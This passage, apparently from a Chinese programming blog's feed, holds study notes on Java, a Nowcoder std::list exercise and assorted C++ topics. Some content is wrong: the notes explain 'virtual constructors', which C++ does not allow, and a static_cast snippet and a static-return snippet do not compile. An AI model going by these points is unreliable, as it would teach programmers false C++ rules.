class="hljs-operator">=</span> Character.isLetterOrDigit(c); <span class="hljs-comment">// 判断c是否是字母或数字</span><br>System.out.println(isLetterOrDigit); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure></li><li><p>如果父类的函数是<code>private</code>，则不会被覆盖。即使子类重写这个函数，但是调用的时候依然是父类的</p></li><li><p>文件的读写</p><ul><li><p>使用<code>scanner</code>和<code>PrintWrite</code></p><ul><li>在使用<code>scanner</code>时，使用<code>file</code>初始化对象</li></ul></li><li><p>使<code>FileInputStream</code>和<code>FileOutputStream</code></p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AB9[模板]链表</title>
    <link href="/2023/04/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/AB9-%E6%A8%A1%E6%9D%BF-%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/04/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/AB9-%E6%A8%A1%E6%9D%BF-%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/97dc1ac2311046618fd19960041e3c6f?tpId=308&tqId=2372688&ru=/exam/company&qru=/ta/algorithm-start/question-ranking&sourceUrl=/exam/company">【模板】链表_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/AB9%5B%E6%A8%A1%E6%9D%BF%5D%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;string&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;list&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;algorithm&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> x&#123;<span class="hljs-number">0</span>&#125;,y&#123;<span class="hljs-number">0</span>&#125;,num&#123;<span class="hljs-number">0</span>&#125;;<br>    std::list&lt;<span class="hljs-type">int</span>&gt; list;<br>    std::string str&#123;&#125;;<br>    std::cin&gt;&gt;num;<br>    <span class="hljs-keyword">auto</span> item=list.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">while</span>(num--)&#123;<br>        std::cin&gt;&gt;str;<br><br>        <span class="hljs-keyword">if</span>(str==<span class="hljs-string">&quot;insert&quot;</span>)&#123;<br>            std::cin&gt;&gt;x&gt;&gt;y;<br>            <span class="hljs-comment">//下面两行如果不存在将返回最后一个迭代器，也就是实现了如果不存在插入到最后一个</span><br>            <span class="hljs-keyword">auto</span> item1=std::<span class="hljs-built_in">find</span>(list.<span class="hljs-built_in">begin</span>(),list.<span class="hljs-built_in">end</span>(),x);<br>            list.<span class="hljs-built_in">insert</span>(item1,y);<br>          <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str==<span class="hljs-string">&quot;delete&quot;</span>)&#123;<br>            std::cin&gt;&gt;y;<br>            <span class="hljs-keyword">auto</span> item1=std::<span class="hljs-built_in">find</span>(list.<span class="hljs-built_in">begin</span>(),list.<span class="hljs-built_in">end</span>(),y);<br>            <br>            <span class="hljs-comment">//下面的if-else 实现的是如果有重复的删除一个</span><br>            <span class="hljs-comment">//如果使用remove(value)将会删除所有的与value相同的</span><br>            <span class="hljs-keyword">if</span>(item1!=list.<span class="hljs-built_in">end</span>()) &#123;<br>                <br>                list.<span class="hljs-built_in">erase</span>(item1);<span class="hljs-comment">//参数必须是迭代器</span><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <br>                list.<span class="hljs-built_in">remove</span>(y);<span class="hljs-comment">//不能是迭代器</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(list.<span class="hljs-built_in">empty</span>())&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;NULL&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item1: list)&#123;<br>            std::cout&lt;&lt;item1&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li><p><code>int x&#123;0&#125;,y&#123;0&#125;,num&#123;0&#125;</code></p><p>这只是一种初始化方式</p></li><li><p><code>list</code>是一个双向的链表</p><ul><li><p><code>insert()</code></p><p>插入元素，有两个参数，有4个重载函数</p><p>但是第一个元素只能是迭代器</p></li><li><p><code>erase()</code></p><p>删除迭代器的元素</p></li><li><p><code>remove(value)</code></p><p>删除所有的与<code>value</code>相等的节点</p></li></ul></li><li><p><code>find()</code></p><p>返回迭代器，如何存在法返回该元素的迭代器，不存在返回最后一个迭代器</p></li></ul></li><li><p>理解</p><p>因为<code>list</code>封装了双向链表，所以直接拿来用</p><p>但是使用<code>find</code>可以查找有没有元素</p></li><li><p>问题</p><ul><li><p>c++封装的链表调用起来会不会时间复杂度很大？</p><blockquote><p>一般情况下，C++ STL 的 <code>list</code> 库的效率要优于手写的链表。这是因为 std::list 不仅实现了常见的操作，例如在任意位置插入&#x2F;删除元素、遍历&#x2F;查找列表、反转&#x2F;排序列表等等，而且还通常采用指针来实现，比手写链表更加高效。</p><p>另外，在 STL 的 list 中，封装程序员带来的好处是程序员不需要设计和编写具体的数据结构，也无需理解底层实现细节。所有 STL 集合类都已经实现了大量的算法和数据结构以及相应的纠错代码，因此能够保证高效、稳定和安全。</p><p>当然，对于一些特殊情况和特定应用场景，手写链表可能会比 C++ STL 的 list 更有效率。但这需要根据具体的实际情况来进行评估和验证。</p><p>总之，在大多数情况下，使用 C++ STL 的 <code>list</code> 库更方便、更高效、更容易维护和调试。</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c++随记</title>
    <link href="/2023/04/11/c++/c++%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/04/11/c++/c++%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="平常笔记"><a href="#平常笔记" class="headerlink" title="平常笔记"></a>平常笔记</h1><ol><li><p>初始化数组需要定义大小才能被<code>cin</code></p></li><li><p><code>cin</code>和<code>scanf</code>一样，都跳过空格</p></li><li><p><code>public</code>和<code>private</code>:用于类的封装</p></li><li><p><code>new </code>和 <code>malloc</code>的主要区别:<code>new</code>调用构造函数，<code>malloc</code>不会</p></li><li><p>int *<code>p1</code> &#x3D; new int[10]，int *<code>p2</code> &#x3D; new int[10]()区别：<code>p1</code>申请的空间里的值是随机值，<code>p2</code>申请的空间里的值已经初始化</p></li><li><p>引用:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> &amp;b=a;<br><span class="hljs-type">int</span> c=<span class="hljs-number">20</span>;<br>b=c;<span class="hljs-comment">//这个意思就是说，将c的值赋值给a,因为b是啊的别名</span><br></code></pre></td></tr></table></figure><p>本质为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>* <span class="hljs-type">const</span> b = &amp;a;<span class="hljs-comment">//所以在引用后，不能改变空间</span><br>*b = <span class="hljs-number">30</span>;<br><span class="hljs-type">int</span> c = <span class="hljs-number">20</span>;<br>*b = c;<br></code></pre></td></tr></table></figure></li><li><p>左值，右值：（但凡能去地址，就是一个左值）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">x++;<span class="hljs-comment">//把x的值取出来，放进临时变量里面，再让临时变量++，此时x的值是临时变量的是，也就是右值</span><br>++x;<span class="hljs-comment">//自增，然后把自己返回，也就是说是左值</span><br></code></pre></td></tr></table></figure><ul><li><p>左值经过函数返回会变成右值，因为会发生拷贝</p></li><li><p>函数里，定义的参数，是个左值</p></li><li><p>用引用写交换函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a,<span class="hljs-type">int</span> &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> tem =b;<br>    b=a;<br>    a=tem;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>int &amp;a:左值引用</p></li><li><p>int &amp;&amp;a:右值引用</p></li></ul></li><li><p>对输出小数的控制</p><ul><li>不引入头文件</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> e=<span class="hljs-number">1</span>;<br>    cout.<span class="hljs-built_in">precision</span>(<span class="hljs-number">4</span>);<br>    cout&lt;&lt;fixed&lt;&lt;e/<span class="hljs-number">3</span>&lt;&lt;endl;<br>    cout&lt;&lt;e/<span class="hljs-number">3</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//将输出4位小数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>引入头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> e=<span class="hljs-number">1</span>;<br>    cout&lt;&lt;fixed&lt;&lt;<span class="hljs-built_in">setprecision</span>(<span class="hljs-number">4</span>)&lt;&lt;e/<span class="hljs-number">3</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//输出4位小数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>string.at(n)</code>:用于获取指定字符，n就是获取字符的下标</p></li><li><p>使用new,创建的指针p,用法和数组一样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *p=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">int</span> *q=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        p[i]=i;<span class="hljs-comment">//可以相当于创建了一个数组，对于数组的存储可以用arr[i]=int类型</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        q[i]=p[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        cout&lt;&lt;q[i]&lt;&lt;<span class="hljs-string">&quot;\t&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>打印16进制</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">cout&lt;&lt;hex&lt;&lt;<span class="hljs-string">&quot;类容&quot;</span>&lt;&lt;endl;<span class="hljs-comment">//可用于打印地址</span><br></code></pre></td></tr></table></figure></li><li><p><code>public</code>成员最好不要在类中赋值,而是使用成员初始化列表</p></li><li><p>在使用继承释放内存时，注意父类使用虚析构</p></li><li><p>构造函数的技巧：在声明的时候参数缺省</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">My_class</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">My_class</span>(<span class="hljs-type">double</span> num1=<span class="hljs-number">0.0</span>,<span class="hljs-type">double</span> num2=<span class="hljs-number">0.0</span>);<br>    ~<span class="hljs-built_in">My_class</span>();<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">double</span> m_num1;<br>    <span class="hljs-type">double</span> m_num2;<br><br>&#125;;<br><br><span class="hljs-comment">//构造</span><br>My_class::<span class="hljs-built_in">My_class</span>(<span class="hljs-type">double</span> num1,<span class="hljs-type">double</span> num2) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;My_class::My_class() &quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>在声明的时候对参数缺省，在定义的时候不需要（会报错）</p><p><img src="C:\Users\12414\Desktop\笔记\c++\平常笔记.assets\image-20221210113213961.png" alt="image-20221210113213961"></p></li><li><p>引用做函数返回值</p><ul><li><p>不要将局部变量作为返回值</p></li><li><p>函数的返回值可以作为左值存在</p></li><li><p>如果函数的返回值，是左值必须是引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-function"><span class="hljs-type">int</span>&amp; <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//int a=10;//这么写会报错</span><br>    <span class="hljs-type">static</span><br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span>&amp; a = <span class="hljs-built_in">func</span>();<br>    cout &lt;&lt; a &lt;&lt; endl;<br>    cout &lt;&lt; a &lt;&lt; endl;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>在c++里面，有时候打印不一定需要，<code>string</code>类,特可以用字符指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Type_1,<span class="hljs-keyword">typename</span> Type_2&gt;<br><span class="hljs-function"><span class="hljs-type">void</span>  <span class="hljs-title">Cout</span><span class="hljs-params">(Type_1 a=<span class="hljs-number">0</span>,Type_2 b=<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-string">&quot;a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Cout</span>&lt;<span class="hljs-type">char</span>*,string&gt;(<span class="hljs-string">&quot;char*&quot;</span>,<span class="hljs-string">&quot;string&quot;</span>);<br><span class="hljs-comment">/*    cout&lt;&lt;add&lt;int,int&gt;(a,b)&lt;&lt;endl;</span><br><span class="hljs-comment">    cout&lt;&lt;add&lt;int&gt;(a,b)&lt;&lt;endl;</span><br><span class="hljs-comment">    cout&lt;&lt;add&lt;&gt;(a,b)&lt;&lt;endl;*/</span><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221211212205234.png" alt="image-20221211212205234"></p></li><li><p>c++中读取字符串的函数</p><ul><li><p><code>getline()</code>     <code>string类</code></p><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\学\笔记\c++\平常笔记.assets\平常笔记.assets\image-20221227225137590.png" alt="image-20221227225137590"></p></li><li><p><code>cin.getline()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">cin</span>.getline(str, <span class="hljs-number">20</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">//cin.getline()里面三个参数，第一个是要储存的字符串数组，第二个是最大长度 + 1，最后一个位置用来存储&#x27;\0&#x27;，也就是说你填20，但是只能存前19个字符，第三个是结束符，可省略，默认是换行符</span><br></code></pre></td></tr></table></figure><p>当第二个参数大于数组本身的长度时，只会读取数组这么长</p></li></ul></li><li><p>使用指针遍历时，不能使用数组名，必须重新创建一个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>&#125;,*P=arr;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">6</span>;i++)<br>        <span class="hljs-built_in">cin</span>&gt;&gt;arr[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">6</span>;i&gt;<span class="hljs-number">0</span>;--i)<br>    &#123;<br>        <span class="hljs-built_in">cout</span>&lt;&lt;*P++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>字符串的输入</p><ul><li><p>string类</p><p>使用<code>getline(cin,string名称)</code></p></li><li><p>字符数组类</p><p>使用<code>cin.getline(str,sizeof(str))</code>;</p></li></ul></li><li><p>c++的强制类型转换方式</p><p>使用<code>static_cast&lt;强制传换成的类型&gt;(被转变量名)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a =<span class="hljs-number">2</span>;<br><span class="hljs-type">short</span> b=<span class="hljs-number">3</span>;<br>b=<span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;a;<br></code></pre></td></tr></table></figure></li><li><p><code>using</code>的三个用处</p><ul><li><p>引入命名空间</p></li><li><p>指定别名</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> ModuleType = ClassOne;<br></code></pre></td></tr></table></figure></li><li><p>在子类中引入基类的成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> ClassType::ModuleType;<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>noexcept</code>关键字的使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ThreadEntry</span><span class="hljs-params">()</span> <span class="hljs-keyword">noexcept</span></span>;<br></code></pre></td></tr></table></figure></li><li><p><code>default</code>是c++11的标准，它的作用是告诉编译器声明一个无参的默认构造函数</p><ul><li>与手动写的无参构造有什么区别<ul><li>多文件的编程中，使用<code>default</code>声明的不需要再写实现</li><li>代码执行的效率很高</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;<br>    <br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-built_in">test</span>() = <span class="hljs-keyword">default</span>;<br>        <span class="hljs-built_in">test</span>(<span class="hljs-type">int</span> a)&#123;&#125;<br>        <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;&#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><code>explict</code>这个关键字的作用是用于修饰只有一个参数的构造函数，并要求为显示的，也就是防止用户做可能会发生隐式转换的事情，会报错</p></li><li><p><code>noexcept</code>这是c++11增加的函数，目的是为了提升函数效率，即告诉编译器这个函数不会产生异常。</p></li><li><p><code>=delete</code>表示不能被调用</p></li><li><p><code>decltype </code></p><p><code>auto</code>根据<code>=</code>右边的初始值 <code>value</code> 推导出变量的类型，而 <code>decltype</code> 根据 <code>exp</code> 表达式推导出变量的类型，跟<code>=</code>右边的 <code>value</code> 没有关系。</p></li><li><p><code>lambda</code>表达式</p><p>[见这个](<a href="https://tsy244.github.io/2023/03/26/lambda%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8/">lambda高级使用 - chg (tsy244.github.io)</a>)</p></li><li><p>c++ 父类构造函数声明<code>vitual</code>的作用</p><p>在C++中，当我们派生一个子类时，子类的构造函数会默认调用父类的构造函数以初始化父类的成员变量。而在某些情况下，我们希望能够在父类的构造函数中调用子类重写的虚函数，此时就需要在父类的构造函数声明为<code>virtual</code>。</p><p>具体来说，当父类的构造函数声明为<code>virtual</code>时，如果我们通过子类的指针或引用调用这个构造函数，那么实际被调用的将是子类的构造函数，而不是父类的构造函数。这样可以保证在父类中调用子类的虚函数时，已经完成了子类对象的初始化，避免出现未定义行为的情况。</p><p>需要注意的是，对于同一对象，构造函数的调用顺序是按照继承层次由上至下的，也就是从基类到派生类。因此，在子类的构造函数中，父类的构造函数已经执行完毕，可以调用虚函数，无需再将父类的构造函数声明为<code>virtual</code>。</p></li><li><p>c++父类里使用<code>vitual</code>的函数子类还会继承嘛？</p><p>在 C++ 中，如果一个父类声明了一个虚函数，那么子类继承这个虚函数并且在子类中可以进行重写（override）。当然，如果子类不想重写这个虚函数，也可以直接继承父类中的实现。</p><p>需要注意的是，在父类的构造函数中调用虚函数时，子类的版本不会被调用。这是因为在子类的构造函数执行之前，父类的构造函数已经执行完毕了，此时子类还没有初始化完成。如果在父类的构造函数中调用子类的函数，就有可能出现未定义行为的情况，因此编译器会强制执行父类版本的虚函数。</p><p>总之，如果一个虚函数在父类中已经声明，子类无论是否重写它，在概念上都是继承了这个虚函数，即子类对象拥有这个虚函数的 vtable（虚函数表） 和 vptr（虚指针），可以通过指针或引用来使用这个虚函数。</p></li><li><p>在使用多态的时候应该将父类的析构函数声明<code>vitrual</code></p></li><li><p>在使用<code>virtual</code>的时候体积的增大，是因为携带了很多信息，如虚函数表，虚指针</p></li><li><p>纯虚函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">testFunc</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>含有纯虚函数的class不能声明的对象，只能被派生</p></li><li><p>在初始化列表中调用父类的构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">son</span>:<span class="hljs-keyword">public</span> fat &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">son</span>();<br><br>    ~<span class="hljs-built_in">son</span>();<br>&#125;;<br><br><span class="hljs-comment">//构造</span><br>son::<span class="hljs-built_in">son</span>(): <span class="hljs-built_in">fat</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;son::son()&quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>move()</code>的使用</p><p>于在不进行复制或赋值操作的情况下将对象的所有权从一个对象转移到另一个对象。通过使用move，可以避免对资源进行复制和销毁的昂贵开销，从而提高代码效率。</p><p>在构造函数中可以使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">fat::<span class="hljs-built_in">fat</span>(std::string str):<span class="hljs-built_in">str</span>(std::<span class="hljs-built_in">move</span>(str)) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;name::name()&quot;</span> 